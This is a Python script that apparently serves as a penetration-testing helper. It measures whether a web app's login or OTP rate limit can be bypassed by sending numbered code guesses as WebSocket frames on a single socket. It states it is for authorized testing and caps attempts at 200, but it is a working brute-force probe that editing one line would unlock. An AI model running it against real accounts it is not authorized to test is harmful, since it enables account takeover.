#!/usr/bin/env python3
"""
ws_ratelimit_test.py — measure a rate-limit bypass over WebSockets (benign proof, no real brute).

HTTP rate limits frequently DON'T apply to WebSocket messages, so a login/OTP gate that's throttled
over HTTP can be unlimited over the socket (guide §10). This helper sends a BOUNDED number of attempt
frames on ONE socket and reports how many were processed/accepted — the proof that the per-request
cap is bypassed — WITHOUT cracking a real account.

Authorized testing only. Your own account. Keep --count small. The point is the measured count, not
a real brute. Tune --template / --success to the app's frames.
"""
import argparse, asyncio, sys
try:
    import websockets
except ImportError:
    sys.exit("pip install websockets")


async def run(args):
    headers = {}
    if args.cookie:
        headers["Cookie"] = args.cookie
    if args.count > 200:
        sys.exit("Refusing count > 200 — a measured bypass needs a reasonable number, not a real brute.")

    accepted = 0
    rejected = 0
    print(f"[*] one socket, {args.count} attempts — measuring rate-limit bypass (own account only)")
    try:
        async with websockets.connect(args.url, extra_headers=headers, open_timeout=15) as ws:
            for i in range(args.count):
                frame = args.template.replace("{i}", str(i).zfill(args.width))
                await ws.send(frame)
                try:
                    reply = await asyncio.wait_for(ws.recv(), timeout=args.wait)
                except asyncio.TimeoutError:
                    reply = ""
                # crude success/failure signal — TUNE --success / --reject to the app
                low = str(reply).lower()
                if args.reject and args.reject.lower() in low:
                    rejected += 1
                else:
                    accepted += 1
    except Exception as e:
        print(f"[!] connection failed: {e}")
        return

    print(f"\n-- accepted/processed: {accepted}   rejected('{args.reject}'): {rejected}   of {args.count}")
    if accepted > 5 and (not args.cap or accepted > args.cap):
        print(f"→ {accepted} attempts processed on ONE socket"
              + (f" (HTTP cap is {args.cap})" if args.cap else "")
              + " → RATE-LIMIT BYPASS over WebSocket → brute feasible → ATO chain (guide §10).")
    else:
        print("→ Looks throttled / locked over WS, or the success signal needs tuning (--reject/--success).")


def main():
    p = argparse.ArgumentParser(description="Measure WS rate-limit bypass (authorized testing only).")
    p.add_argument("--url", required=True)
    p.add_argument("--cookie", help="Cookie header for your own account")
    p.add_argument("--template", default='{"type":"verifyOtp","code":"{i}"}',
                   help="frame template; {i} is the attempt index (default OTP example)")
    p.add_argument("--width", type=int, default=3, help="zero-pad width for {i} (default 3 → 000..)")
    p.add_argument("--reject", default="invalid", help="substring in a REJECTED reply (default 'invalid')")
    p.add_argument("--success", help="(optional) substring marking a SUCCESS reply")
    p.add_argument("--cap", type=int, help="(optional) the documented HTTP attempt cap, for the report line")
    p.add_argument("--count", type=int, default=50, help="bounded attempts (default 50)")
    p.add_argument("--wait", type=float, default=2.0, help="seconds to wait per reply")
    asyncio.run(run(p.parse_args()))


if __name__ == "__main__":
    main()
